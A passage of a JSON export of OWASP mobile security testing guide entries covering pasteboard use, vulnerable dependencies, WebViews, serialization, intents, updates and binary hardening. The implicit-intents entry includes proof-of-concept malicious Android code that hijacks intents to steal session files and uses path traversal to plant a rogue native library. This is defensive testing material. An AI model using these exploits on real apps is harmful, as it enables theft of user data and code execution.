href=\"https://mas.owasp.org/MASTG-TOOL-0073\" rel=\"noopener noreferrer\" target=\"_blank\"> radare2 for iOS</a></em> to detect usage of the general pasteboard.</li><li>Run a static analysis scan using <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0073\" rel=\"noopener noreferrer\" target=\"_blank\"> radare2 for iOS</a></em> to detect usage of the pasteboard methods which may be handling sensitive data.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of locations where relevant APIs are used.</p><h2></h2><h2>Evaluation</h2><p>The test fails if calls are made to UIPasteboard.generalPasteboard and sensitive data is written to it.</p><p>Since determining what constitutes sensitive data is context-dependent, it can be difficult to detect statically. To check if sensitive data is being written to the pasteboard using the aforementioned methods, inspect the reported code locations in the reverse-engineered code (see <em><a href=\"https://mas.owasp.org/MASTG-TECH-0076\" rel=\"noopener noreferrer\" target=\"_blank\"> Reviewing Disassembled Objective-C and Swift Code</a></em>).</p>",
        "code": "MASTG-TEST-0276",
        "sort_order": 84
    },
    {
        "tags":
        [
            "MASTG-TEST-0274: Dependencies with Known Vulnerabilities in the App's SBOM"
        ],
        "testcase": "Dependencies with Known Vulnerabilities in the App's SBOM",
        "details": "<h2>Overview</h2><p>In this test case we are identifying dependencies with known vulnerabilities by relying on a Software Bill of Material (SBOM).</p><h2></h2><h2>Steps</h2><ol><li>Either ask the development team to share a SBOM in CycloneDX format, or, if you have access to the original source code, create one following <em><a href=\"https://mas.owasp.org/MASTG-TECH-0130\" rel=\"noopener noreferrer\" target=\"_blank\"> Software Composition Analysis (SCA) of Android Dependencies by Creating a SBOM</a></em>.</li><li>Upload the SBOM to <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0132\" rel=\"noopener noreferrer\" target=\"_blank\"> dependency-track</a></em>.</li><li>Inspect the <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0132\" rel=\"noopener noreferrer\" target=\"_blank\"> dependency-track</a></em> project for the use of vulnerable dependencies.</li></ol><h2></h2><h2>Observation</h2><p>The output should include a list of dependencies with names and CVE identifiers, if any.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if you can find dependencies with known vulnerabilities.</p>",
        "code": "MASTG-TEST-0274",
        "sort_order": 100
    },
    {
        "tags":
        [
            "MASTG-TEST-0043: Memory Corruption Bugs"
        ],
        "testcase": "Memory Corruption Bugs",
        "details": "<h2>Overview</h2><h2></h2><h2>Static Analysis</h2><p>There are various items to look for:</p><ul><li>Are there native code parts? If so: check for the given issues in the general memory corruption section. Native code can easily be spotted given JNI-wrappers, .CPP/.H/.C files, NDK or other native frameworks.</li><li>Is there Java code or Kotlin code? Look for Serialization/deserialization issues, such as described in <a href=\"https://securitylab.github.com/research/android-deserialization-vulnerabilities\" rel=\"noopener noreferrer\" target=\"_blank\">A brief history of Android deserialization vulnerabilities ↗</a>.</li></ul><p>Note that there can be Memory leaks in Java/Kotlin code as well. Look for various items, such as: BroadcastReceivers which are not unregistered, static references to Activity or View classes, Singleton classes that have references to Context, Inner Class references, Anonymous Class references, AsyncTask references, Handler references, Threading done wrong, TimerTask references. For more details, please check:</p><ul><li><a href=\"https://android.jlelse.eu/9-ways-to-avoid-memory-leaks-in-android-b6d81648e35e\" rel=\"noopener noreferrer\" target=\"_blank\">9 ways to avoid memory leaks in Android ↗</a></li><li><a href=\"https://android.jlelse.eu/memory-leak-patterns-in-android-4741a7fcb570\" rel=\"noopener noreferrer\" target=\"_blank\">Memory Leak Patterns in Android ↗</a>.</li></ul><h2></h2><h2>Dynamic Analysis</h2><p>There are various steps to take:</p><ul><li>In case of native code: use Valgrind or Mempatrol to analyze the memory usage and memory calls made by the code.</li><li>In case of Java/Kotlin code, try to recompile the app and use it with <a href=\"https://github.com/square/leakcanary\" rel=\"noopener noreferrer\" target=\"_blank\">Squares leak canary ↗</a>.</li><li>Check with the <a href=\"https://developer.android.com/studio/profile/memory-profiler\" rel=\"noopener noreferrer\" target=\"_blank\">Memory Profiler from Android Studio ↗</a> for leakage.</li><li>Check with the <a href=\"https://github.com/modzero/modjoda\" rel=\"noopener noreferrer\" target=\"_blank\">Android Java Deserialization Vulnerability Tester ↗</a>, for serialization vulnerabilities.</li></ul>",
        "code": "MASTG-TEST-0043",
        "sort_order": 95
    },
    {
        "tags":
        [
            "MASTG-TEST-0245: References to Platform Version APIs"
        ],
        "testcase": "References to Platform Version APIs",
        "details": "<h2>Overview</h2><p>This test verifies whether an app is running on a recent version of the Android operating system.</p><p>In Kotlin, Android apps can determine the OS version using the Build.VERSION.SDK_INT property, which returns the API level of the current system. By comparing it to a specific version constant, such as Build.VERSION_CODES.UPSIDE_DOWN_CAKE for Android 14 (API level 34), apps can conditionally execute code based on the OS version. In this example, \"Upside Down Cake\" is the internal codename for Android 14.</p><p>Android apps specify a minSdkVersion, which defines the oldest OS version they support. While a high minSdkVersion reduces the need for runtime version checks, dynamically verifying the OS version using Build.VERSION.SDK_INT remains beneficial. It allows apps to take advantage of newer, more secure features when available while maintaining backward compatibility.</p><h2></h2><h2>Steps</h2><ol><li>Use either <em><a href=\"https://mas.owasp.org/MASTG-TECH-0014\" rel=\"noopener noreferrer\" target=\"_blank\"> Static Analysis on Android</a></em> with a tool such as <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0110\" rel=\"noopener noreferrer\" target=\"_blank\"> semgrep</a></em> to identify APIs that check the version of the operating system.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of locations where relevant APIs are used.</p><h2></h2><h2>Evaluation</h2><p>The test fails if the app does not include any API calls to verify the operating system version.</p>",
        "code": "MASTG-TEST-0245",
        "sort_order": 98
    },
    {
        "tags":
        [
            "MASTG-TEST-0027: Testing for URL Loading in WebViews"
        ],
        "testcase": "Testing for URL Loading in WebViews",
        "details": "<h2>Overview</h2><p>In order to test for <a href=\"https://mas.owasp.org/MASTG/0x05h-Testing-Platform-Interaction/#url-loading-in-webviews\" rel=\"noopener noreferrer\" target=\"_blank\">URL loading in WebViews</a> you need to carefully analyze <a href=\"https://developer.android.com/guide/webapps/webview#HandlingNavigation\" rel=\"noopener noreferrer\" target=\"_blank\">handling page navigation ↗</a>, especially when users might be able to navigate away from a trusted environment. The default and safest behavior on Android is to let the default web browser open any link that the user might click inside the WebView. However, this default logic can be modified by configuring a WebViewClient which allows navigation requests to be handled by the app itself.</p><h2></h2><h2>Static Analysis</h2><h3>Check for Page Navigation Handling Override</h3><p>To test if the app is overriding the default page navigation logic by configuring a WebViewClient you should search for and inspect the following interception callback functions:</p><ul><li>shouldOverrideUrlLoading allows your application to either abort loading WebViews with suspicious content by returning true or allow the WebView to load the URL by returning false. Considerations:<ul><li>This method is not called for POST requests.</li><li>This method is not called for XmlHttpRequests, iFrames, \"src\" attributes included in HTML or &lt;script&gt; tags. Instead, shouldInterceptRequest should take care of this.</li></ul></li><li>shouldInterceptRequest allows the application to return the data from resource requests. If the return value is null, the WebView will continue to load the resource as usual. Otherwise, the data returned by the shouldInterceptRequest method is used. Considerations:<ul><li>This callback is invoked for a variety of URL schemes (e.g., http(s):, data:, file:, etc.), not only those schemes which send requests over the network.</li><li>This is not called for javascript: or blob: URLs, or for assets accessed via file:///android_asset/ or file:///android_res/ URLs. In the case of redirects, this is only called for the initial resource URL, not any subsequent redirect URLs.</li><li>When Safe Browsing is enabled, these URLs still undergo Safe Browsing checks but the developer can allow the URL with setSafeBrowsingWhitelist or even ignore the warning via the onSafeBrowsingHit callback.</li></ul></li></ul><p>As you can see there are a lot of points to consider when testing the security of WebViews that have a WebViewClient configured, so be sure to carefully read and understand all of them by checking the <a href=\"https://developer.android.com/reference/android/webkit/WebViewClient\" rel=\"noopener noreferrer\" target=\"_blank\">WebViewClient Documentation ↗</a>.</p><h3>Check for EnableSafeBrowsing Disabled</h3><p>While the default value of EnableSafeBrowsing is true, some applications might opt to disable it. To verify that SafeBrowsing is enabled, inspect the AndroidManifest.xml file and make sure that the configuration below is not present:</p><pre>&lt;manifest&gt;\n    &lt;application&gt;\n        &lt;meta-data android:name=\"android.webkit.WebView.EnableSafeBrowsing\"\n                   android:value=\"false\" /&gt;\n        ...\n    &lt;/application&gt;\n&lt;/manifest&gt;\n</pre><h2></h2><h2>Dynamic Analysis</h2><p>A convenient way to dynamically test deep linking is to use Frida or frida-trace and hook the shouldOverrideUrlLoading, shouldInterceptRequest methods while using the app and clicking on links within the WebView. Be sure to also hook other related <a href=\"https://developer.android.com/reference/android/net/Uri\" rel=\"noopener noreferrer\" target=\"_blank\">Uri ↗</a> methods such as getHost, getScheme or getPath which are typically used to inspect the requests and match known patterns or deny lists.</p>",
        "code": "MASTG-TEST-0027",
        "sort_order": 92
    },
    {
        "tags":
        [
            "MASTG-TEST-0034: Testing Object Persistence"
        ],
        "testcase": "Testing Object Persistence",
        "details": "<h2>Overview</h2><p>To test for <a href=\"https://mas.owasp.org/MASTG/0x05h-Testing-Platform-Interaction/#object-persistence\" rel=\"noopener noreferrer\" target=\"_blank\">object persistence</a> being used for storing sensitive information on the device, first identify all instances of object serialization and check if they carry any sensitive data. If yes, check if it is properly protected against eavesdropping or unauthorized modification.</p><p>There are a few generic remediation steps that you can always take:</p><ol><li>Make sure that sensitive data has been encrypted and HMACed/signed after serialization/persistence. Evaluate the signature or HMAC before you use the data. See the chapter \"<a href=\"https://mas.owasp.org/MASTG/0x05e-Testing-Cryptography/\" rel=\"noopener noreferrer\" target=\"_blank\">Android Cryptographic APIs</a>\" for more details.</li><li>Make sure that the keys used in step 1 can't be extracted easily. The user and/or application instance should be properly authenticated/authorized to obtain the keys. See the chapter \"<a href=\"https://mas.owasp.org/MASTG/0x05d-Testing-Data-Storage/\" rel=\"noopener noreferrer\" target=\"_blank\">Data Storage on Android</a>\" for more details.</li><li>Make sure that the data within the de-serialized object is carefully validated before it is actively used (e.g., no exploit of business/application logic).</li></ol><p>For high-risk applications that focus on availability, we recommend that you use Serializable only when the serialized classes are stable. Second, we recommend not using reflection-based persistence because</p><ul><li>the attacker could find the method's signature via the String-based argument</li><li>the attacker might be able to manipulate the reflection-based steps to execute business logic.</li></ul><h2></h2><h2>Static Analysis</h2><h3>Object Serialization</h3><p>Search the source code for the following keywords:</p><ul><li>import java.io.Serializable</li><li>implements Serializable</li></ul><h3>JSON</h3><p>If you need to counter memory-dumping, make sure that very sensitive information is not stored in the JSON format because you can't guarantee prevention of anti-memory dumping techniques with the standard libraries. You can check for the following keywords in the corresponding libraries:</p><p><strong>JSONObject</strong> Search the source code for the following keywords:</p><ul><li>import org.json.JSONObject;</li><li>import org.json.JSONArray;</li></ul><p><strong>GSON</strong> Search the source code for the following keywords:</p><ul><li>import com.google.gson</li><li>import com.google.gson.annotations</li><li>import com.google.gson.reflect</li><li>import com.google.gson.stream</li><li>new Gson();</li><li>Annotations such as @Expose, @JsonAdapter, @SerializedName,@Since, and @Until</li></ul><p><strong>Jackson</strong> Search the source code for the following keywords:</p><ul><li>import com.fasterxml.jackson.core</li><li>import org.codehaus.jackson for the older version.</li></ul><h3>ORM</h3><p>When you use an ORM library, make sure that the data is stored in an encrypted database and the class representations are individually encrypted before storing it. See the chapters \"<a href=\"https://mas.owasp.org/MASTG/0x05d-Testing-Data-Storage/\" rel=\"noopener noreferrer\" target=\"_blank\">Data Storage on Android</a>\" and \"<a href=\"https://mas.owasp.org/MASTG/0x05e-Testing-Cryptography/\" rel=\"noopener noreferrer\" target=\"_blank\">Android Cryptographic APIs</a>\" for more details. You can check for the following keywords in the corresponding libraries:</p><p><strong>OrmLite</strong> Search the source code for the following keywords:</p><ul><li>import com.j256.*</li><li>import com.j256.dao</li><li>import com.j256.db</li><li>import com.j256.stmt</li><li>import com.j256.table\\</li></ul><p>Please make sure that logging is disabled.</p><p><strong>SugarORM</strong> Search the source code for the following keywords:</p><ul><li>import com.github.satyan</li><li>extends SugarRecord&lt;Type&gt;</li><li>In the AndroidManifest, there will be meta-data entries with values such as DATABASE, VERSION, QUERY_LOG and DOMAIN_PACKAGE_NAME.</li></ul><p>Make sure that QUERY_LOG is set to false.</p><p><strong>GreenDAO</strong> Search the source code for the following keywords:</p><ul><li>import org.greenrobot.greendao.annotation.Convert</li><li>import org.greenrobot.greendao.annotation.Entity</li><li>import org.greenrobot.greendao.annotation.Generated</li><li>import org.greenrobot.greendao.annotation.Id</li><li>import org.greenrobot.greendao.annotation.Index</li><li>import org.greenrobot.greendao.annotation.NotNull</li><li>import org.greenrobot.greendao.annotation.*</li><li>import org.greenrobot.greendao.database.Database</li><li>import org.greenrobot.greendao.query.Query</li></ul><p><strong>ActiveAndroid</strong> Search the source code for the following keywords:</p><ul><li>ActiveAndroid.initialize(&lt;contextReference&gt;);</li><li>import com.activeandroid.Configuration</li><li>import com.activeandroid.query.*</li></ul><p><strong>Realm</strong> Search the source code for the following keywords:</p><ul><li>import io.realm.RealmObject;</li><li>import io.realm.annotations.PrimaryKey;</li></ul><h3>Parcelable</h3><p>Make sure that appropriate security measures are taken when sensitive information is stored in an Intent via a Bundle that contains a Parcelable. Use explicit Intents and verify proper additional security controls when using application-level IPC (e.g., signature verification, intent-permissions, crypto).</p><h2></h2><h2>Dynamic Analysis</h2><p>There are several ways to perform dynamic analysis:</p><ol><li>For the actual persistence: Use the techniques described in the data storage chapter.</li><li>For reflection-based approaches: Use <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0001\" rel=\"noopener noreferrer\" target=\"_blank\"> Frida for Android</a></em> to hook into the deserialization methods or add unprocessable information to the serialized objects to see how they are handled (e.g., whether the application crashes or extra information can be extracted by enriching the objects).</li></ol>",
        "code": "MASTG-TEST-0034",
        "sort_order": 93
    },
    {
        "tags":
        [
            "MASTG-TEST-0026: Testing Implicit Intents"
        ],
        "testcase": "Testing Implicit Intents",
        "details": "<h2>Overview</h2><p>When testing for <a href=\"https://mas.owasp.org/MASTG/0x05h-Testing-Platform-Interaction/#implicit-intents\" rel=\"noopener noreferrer\" target=\"_blank\">implicit intents</a> you need to check if they are vulnerable to injection attacks or potentially leaking sensitive data.</p><h2></h2><h2>Static Analysis</h2><p>Inspect the Android Manifest and look for any &lt;intent&gt; signatures defined inside <a href=\"https://developer.android.com/guide/topics/manifest/queries-element\" rel=\"noopener noreferrer\" target=\"_blank\">blocks ↗</a> (which specify the set of other apps an app intends to interact with), check if it contains any system actions (e.g. android.intent.action.GET_CONTENT, android.intent.action.PICK, android.media.action.IMAGE_CAPTURE, etc.) and browse the source code for their occurrence.</p><p>For example, the following Intent doesn't specify any concrete component, meaning that it's an implicit intent. It sets the action android.intent.action.GET_CONTENT to ask the user for input data and then the app starts the intent by startActivityForResult and specifying an image chooser.</p><pre>Intent intent = new Intent();\nintent.setAction(\"android.intent.action.GET_CONTENT\");\nstartActivityForResult(Intent.createChooser(intent, \"\"), REQUEST_IMAGE);\n</pre><p>The app uses startActivityForResult instead of startActivity, indicating that it expects a result (in this case an image), so you should check how the return value of the intent is handled by looking for the onActivityResult callback. If the return value of the intent isn't properly validated, an attacker may be able to read arbitrary files or execute arbitrary code from the app's internal `/data/data/' storage. A full description of this type of attack can be found in the <a href=\"https://blog.oversecured.com/Interception-of-Android-implicit-intents\" rel=\"noopener noreferrer\" target=\"_blank\">following blog post ↗</a>.</p><h3>Case 1: Arbitrary File Read</h3><p>In this example we're going to see how an attacker can read arbitrary files from within the app's internal storage /data/data/&lt;appname&gt; due to the improper validation of the return value of the intent.</p><p>The performAction method in the following example reads the implicit intents return value, which can be an attacker provided URI and hands it to getFileItemFromUri. This method copies the file to a temp folder, which is usual if this file is displayed internally. But if the app stores the URI provided file in an external temp directory e.g by calling getExternalCacheDir or getExternalFilesDir an attacker can read this file after setting the permission android.permission.READ_EXTERNAL_STORAGE.</p><pre>private void performAction(Action action){\n  ...\n  Uri data = intent.getData();\n  if (!(data == null || (fileItemFromUri = getFileItemFromUri(data)) == null)) {\n      ...\n  }\n}\n\nprivate FileItem getFileItemFromUri(Context, context, Uri uri){\n  String fileName = UriExtensions.getFileName(uri, context);\n  File file = new File(getExternalCacheDir(), \"tmp\");\n  file.createNewFile();\n  copy(context.openInputStream(uri), new FileOutputStream(file));\n  ...\n}\n</pre><p>The following is the source of a malicious app that exploits the above vulnerable code.</p><p>AndroidManifest.xml</p><pre>&lt;uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\" /&gt;\n&lt;application&gt;\n  &lt;activity android:name=\".EvilContentActivity\"&gt;\n      &lt;intent-filter android:priority=\"999\"&gt;\n          &lt;action android:name=\"android.intent.action.GET_CONTENT\" /&gt;\n          &lt;data android:mimeType=\"*/*\" /&gt;\n      &lt;/intent-filter&gt;\n  &lt;/activity&gt;\n&lt;/application&gt;\n</pre><p>EvilContentActivity.java</p><pre>public class EvilContentActivity extends Activity{\n  @Override\n  protected void OnCreate(@Nullable Bundle savedInstanceState){\n    super.OnCreate(savedInstanceState);\n    setResult(-1, new Intent().setData(Uri.parse(\"file:///data/data/&lt;victim_app&gt;/shared_preferences/session.xml\")));\n    finish();\n  }\n}\n</pre><p>If the user selects the malicious app to handle the intent, the attacker can now steal the session.xml file from the app's internal storage. In the previous example, the victim must explicitly select the attacker's malicious app in a dialog. However, developers may choose to suppress this dialog and automatically determine a recipient for the intent. This would allow the attack to occur without any additional user interaction.</p><p>The following code sample implements this automatic selection of the recipient. By specifying a priority in the malicious app's intent filter, the attacker can influence the selection sequence.</p><pre>Intent intent = new Intent(\"android.intent.action.GET_CONTENT\");\nfor(ResolveInfo info : getPackageManager().queryIntentActivities(intent, 0)) {\n    intent.setClassName(info.activityInfo.packageName, info.activityInfo.name);\n    startActivityForResult(intent);\n    return;\n}\n</pre><h3>Case 2: Arbitrary Code Execution</h3><p>An improperly handled return value of an implicit intent can lead to arbitrary code execution if the victim app allows content:// and file:// URLs.</p><p>An attacker can implement a <a href=\"https://developer.android.com/reference/android/content/ContentProvider\" rel=\"noopener noreferrer\" target=\"_blank\">ContentProvider ↗</a> that contains public Cursor query(...) to set an arbitrary file (in this case <em>lib.so</em>), and if the victim loads this file from the content provider by executing copy the attacker's ParcelFileDescriptor openFile(...) method will be executed and return a malicious <em>fakelib.so</em>.</p><p>AndroidManifest.xml</p><pre>&lt;uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\" /&gt;\n&lt;application&gt;\n  &lt;activity android:name=\".EvilContentActivity\"&gt;\n      &lt;intent-filter android:priority=\"999\"&gt;\n          &lt;action android:name=\"android.intent.action.GET_CONTENT\" /&gt;\n          &lt;data android:mimeType=\"*/*\" /&gt;\n      &lt;/intent-filter&gt;\n  &lt;/activity&gt;\n  &lt;provider android:name=\".EvilContentProvider\" android:authorities=\"com.attacker.evil\" android:enabled=\"true\" android:exported=\"true\"&gt;&lt;/provider&gt;\n&lt;/application&gt;\n</pre><p>EvilContentProvider.java</p><pre>public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {\n    MatrixCursor matrixCursor = new MatrixCursor(new String[]{\"_display_name\"});\n    matrixCursor.addRow(new Object[]{\"../lib-main/lib.so\"});\n    return matrixCursor;\n}\npublic ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {\n    return ParcelFileDescriptor.open(new File(\"/data/data/com.attacker/fakelib.so\"), ParcelFileDescriptor.MODE_READ_ONLY);\n}\n</pre><p>EvilContentActivity.java</p><pre>public class EvilContentActivity extends Activity{\n  @Override\n  protected void OnCreate(@Nullable Bundle savedInstanceState){\n    super.OnCreate(savedInstanceState);\n    setResult(-1, new Intent().setData(Uri.parse(\"content:///data/data/com.attacker/fakelib.so\")));\n    finish();\n  }\n}\n</pre><h2></h2><h2>Dynamic Analysis</h2><p>A convenient way to dynamically test for implicit intents, especially to identify potentially leaked sensitive data, is to use Frida or frida-trace and hook the startActivityForResult and onActivityResult methods and inspect the provided intents and the data they contain.</p>",
        "code": "MASTG-TEST-0026",
        "sort_order": 91
    },
    {
        "tags":
        [
            "MASTG-TEST-0272: Identify Dependencies with Known Vulnerabilities in the Android Project"
        ],
        "testcase": "Identify Dependencies with Known Vulnerabilities in the Android Project",
        "details": "<h2>Overview</h2><p>In this test case we will identify dependencies in Android Studio and scan them with <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0131\" rel=\"noopener noreferrer\" target=\"_blank\"> dependency-check</a></em>.</p><h2></h2><h2>Steps</h2><ol><li>Follow <em><a href=\"https://mas.owasp.org/MASTG-TECH-0131\" rel=\"noopener noreferrer\" target=\"_blank\"> Software Composition Analysis (SCA) of Android Dependencies at Build Time</a></em> and execute a scan through the build environment of Android Studio by using Gradle.</li></ol><h2></h2><h2>Observation</h2><p>The output should include the dependency and the CVE identifiers for any dependency with known vulnerabilities.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if you can find dependencies with known vulnerabilities.</p>",
        "code": "MASTG-TEST-0272",
        "sort_order": 99
    },
    {
        "tags":
        [
            "MASTG-TEST-0036: Testing Enforced Updating"
        ],
        "testcase": "Testing Enforced Updating",
        "details": "<h2>Overview</h2><p>To test for <a href=\"https://mas.owasp.org/MASTG/0x05h-Testing-Platform-Interaction/#enforced-updating\" rel=\"noopener noreferrer\" target=\"_blank\">enforced updating</a> you need to check if the app has support for in-app updates and validate if it's properly enforced so that the user is not able to continue using the app without updating it first.</p><h2></h2><h2>Static analysis</h2><p>The code sample below shows the example of an app-update:</p><pre>//Part 1: check for update\n// Creates instance of the manager.\nAppUpdateManager appUpdateManager = AppUpdateManagerFactory.create(context);\n\n// Returns an intent object that you use to check for an update.\nTask&lt;AppUpdateInfo&gt; appUpdateInfo = appUpdateManager.getAppUpdateInfo();\n\n// Checks that the platform will allow the specified type of update.\nif (appUpdateInfo.updateAvailability() == UpdateAvailability.UPDATE_AVAILABLE\n      // For a flexible update, use AppUpdateType.FLEXIBLE\n      &amp;&amp; appUpdateInfo.isUpdateTypeAllowed(AppUpdateType.IMMEDIATE)) {\n\n                  //...Part 2: request update\n                  appUpdateManager.startUpdateFlowForResult(\n                     // Pass the intent that is returned by 'getAppUpdateInfo()'.\n                     appUpdateInfo,\n                     // Or 'AppUpdateType.FLEXIBLE' for flexible updates.\n                     AppUpdateType.IMMEDIATE,\n                     // The current activity making the update request.\n                     this,\n                     // Include a request code to later monitor this update request.\n                     MY_REQUEST_CODE);\n\n                     //...Part 3: check if update completed successfully\n @Override\n public void onActivityResult(int requestCode, int resultCode, Intent data) {\n   if (myRequestCode == MY_REQUEST_CODE) {\n     if (resultCode != RESULT_OK) {\n       log(\"Update flow failed! Result code: \" + resultCode);\n       // If the update is cancelled or fails,\n       // you can request to start the update again in case of forced updates\n     }\n   }\n }\n\n //..Part 4:\n // Checks that the update is not stalled during 'onResume()'.\n// However, you should execute this check at all entry points into the app.\n@Override\nprotected void onResume() {\n  super.onResume();\n\n  appUpdateManager\n      .getAppUpdateInfo()\n      .addOnSuccessListener(\n          appUpdateInfo -&gt; {\n            ...\n            if (appUpdateInfo.updateAvailability()\n                == UpdateAvailability.DEVELOPER_TRIGGERED_UPDATE_IN_PROGRESS) {\n                // If an in-app update is already running, resume the update.\n                manager.startUpdateFlowForResult(\n                    appUpdateInfo,\n                    IMMEDIATE,\n                    this,\n                    MY_REQUEST_CODE);\n            }\n          });\n}\n}\n</pre><p>Source: <a href=\"https://developer.android.com/guide/app-bundle/in-app-updates\" rel=\"noopener noreferrer\" target=\"_blank\">https://developer.android.com/guide/app-bundle/in-app-updates ↗</a></p><h2></h2><h2>Dynamic analysis</h2><p>In order to test for proper updating: try downloading an older version of the application with a security vulnerability, either by a release from the developers or by using a third party app-store. Next, verify whether or not you can continue to use the application without updating it. If an update prompt is given, verify if you can still use the application by canceling the prompt or otherwise circumventing it through normal application usage. This includes validating whether the backend will stop calls to vulnerable backends and/or whether the vulnerable app-version itself is blocked by the backend. Lastly, try modifying the version number of an app while intercepting its traffic using a MIMT proxy, and observe how the backend responds (including whether the change is recorded, for example).</p>",
        "code": "MASTG-TEST-0036",
        "sort_order": 94
    },
    {
        "tags":
        [
            "MASTG-TEST-0223: Stack Canaries Not Enabled"
        ],
        "testcase": "Stack Canaries Not Enabled",
        "details": "<h2>Overview</h2><p>This test case checks if the <a href=\"https://mas.owasp.org/MASTG/0x05i-Testing-Code-Quality-and-Build-Settings/#binary-protection-mechanisms\" rel=\"noopener noreferrer\" target=\"_blank\">native libraries</a> of the app are compiled without stack canaries and therefore lacking <a href=\"https://mas.owasp.org/MASTG/0x04h-Testing-Code-Quality/#stack-smashing-protection\" rel=\"noopener noreferrer\" target=\"_blank\">stack smashing protection</a>, a common mitigation technique against buffer overflow attacks.</p><ul><li>NDK libraries should have stack canaries enabled since <a href=\"https://android.googlesource.com/platform/ndk/%2B/master/docs/BuildSystemMaintainers.md#additional-required-arguments\" rel=\"noopener noreferrer\" target=\"_blank\">the compiler does it by default ↗</a>.</li><li>Other custom C/C++ libraries might not have stack canaries enabled because they lack the necessary compiler flags (-fstack-protector-strong, or -fstack-protector-all) or the canaries were optimized out by the compiler. See the <a href=\"https://mas.owasp.org/MASTG/tests/android/MASVS-CODE/MASTG-TEST-0223/#evaluation\" rel=\"noopener noreferrer\" target=\"_blank\">Evaluation</a> section for more details.</li></ul><h2></h2><h2>Steps</h2><ol><li>Extract the app contents (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0058\" rel=\"noopener noreferrer\" target=\"_blank\"> Exploring the App Package</a></em>).</li><li>Run <em><a href=\"https://mas.owasp.org/MASTG-TECH-0115\" rel=\"noopener noreferrer\" target=\"_blank\"> Obtaining Compiler-Provided Security Features</a></em> on each shared library and grep for \"canary\" or the corresponding keyword used by the selected tool.</li></ol><h2></h2><h2>Observation</h2><p>The output should show if stack canaries are enabled or disabled.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if stack canaries are disabled.</p><p>Developers need to ensure that the flags -fstack-protector-strong, or -fstack-protector-all are set in the compiler flags for all native libraries. This is especially important for custom C/C++ libraries that are not part of the NDK.</p><p>When evaluating this please note that there are potential <strong>expected false positives</strong> for which the test case should be considered as passed. To be certain for these cases, they require manual review of the original source code and the compilation flags used.</p><p>The following examples cover some of the false positive cases that might be encountered:</p><h3>Use of Memory Safe Languages</h3><p>The Flutter framework does not use stack canaries because of the way <a href=\"https://docs.flutter.dev/reference/security-false-positives#shared-objects-should-use-stack-canary-values\" rel=\"noopener noreferrer\" target=\"_blank\">Dart mitigates buffer overflows ↗</a>.</p><h3>Compiler Optimizations</h3><p>Sometimes, due to the size of the library and the optimizations applied by the compiler, it might be possible that the library was originally compiled with stack canaries but they were optimized out. For example, this is the case for some <a href=\"https://github.com/facebook/react-native/issues/36870#issuecomment-1714007068\" rel=\"noopener noreferrer\" target=\"_blank\">react native apps ↗</a>. They are built with -fstack-protector-strong but when attempting to search for stack_chk_fail inside the .so files, it is not found.</p><ul><li><strong>Empty .so files</strong>: Some .so files such as libruntimeexecutor.so or libreact_render_debug.so are effectively empty in release and therefore contain no symbols. Even if you were to attempt to build with -fstack-protector-all, you still won't be able to see the stack_chk_fail string as there are no method calls there.</li><li><strong>Lack of stack buffer calls</strong>: Other files such as libreact_utils.so, libreact_config.so, and libreact_debug.so are not empty and contain method calls, but those methods don't contain stack buffer calls, so there are no stack_chk_fail strings inside them.</li></ul><p>The React Native developers in this case declare that they won't be adding -fstack-protector-all as, in their case, <a href=\"https://github.com/OWASP/mastg/pull/3049#pullrequestreview-2420837259\" rel=\"noopener noreferrer\" target=\"_blank\">they consider that doing so will add a performance hit for no effective security gain</a>.</p>",
        "code": "MASTG-TEST-0223",
        "sort_order": 97
    },
    {
        "tags":
        [
            "MASTG-TEST-0222: Position Independent Code (PIC) Not Enabled"
        ],
        "testcase": "Position Independent Code (PIC) Not Enabled",
        "details": "<h2>Overview</h2><p>This test case checks if the <a href=\"https://mas.owasp.org/MASTG/0x05i-Testing-Code-Quality-and-Build-Settings/#binary-protection-mechanisms\" rel=\"noopener noreferrer\" target=\"_blank\">native libraries</a> of the app are compiled without enabling <a href=\"https://mas.owasp.org/MASTG/0x04h-Testing-Code-Quality/#position-independent-code\" rel=\"noopener noreferrer\" target=\"_blank\">Position Independent Code (PIC)</a>, a common mitigation technique against memory corruption attacks.</p><p>Since Android 5.0 (API level 21), Android requires <a href=\"https://source.android.com/docs/security/enhancements/#android-5\" rel=\"noopener noreferrer\" target=\"_blank\">all dynamically linked executables to support PIE ↗</a>.</p><p><a href=\"https://android.googlesource.com/platform/ndk/%2B/master/docs/BuildSystemMaintainers.md#additional-required-arguments\" rel=\"noopener noreferrer\" target=\"_blank\">Build System Maintainers Guide - Additional Required Arguments ↗</a>: Android requires Position-independent executables beginning with API 21. Clang builds PIE executables by default. If invoking the linker directly or not using Clang, use -pie when linking.</p><h2></h2><h2>Steps</h2><ol><li>Extract the app contents (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0007\" rel=\"noopener noreferrer\" target=\"_blank\"> Exploring the App Package</a></em>).</li><li>Run <em><a href=\"https://mas.owasp.org/MASTG-TECH-0115\" rel=\"noopener noreferrer\" target=\"_blank\"> Obtaining Compiler-Provided Security Features</a></em> on each shared library and grep for \"pic\" or the corresponding keyword used by the selected tool.</li></ol><h2></h2><h2>Observation</h2><p>The output should list if PIC is enabled or disabled.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if PIC is disabled.</p>",
        "code": "MASTG-TEST-0222",
        "sort_order": 96
    },
    {
        "tags":
        [
            "MASTG-TEST-0046: Testing Anti-Debugging Detection"
        ],
        "testcase": "Testing Anti-Debugging Detection",
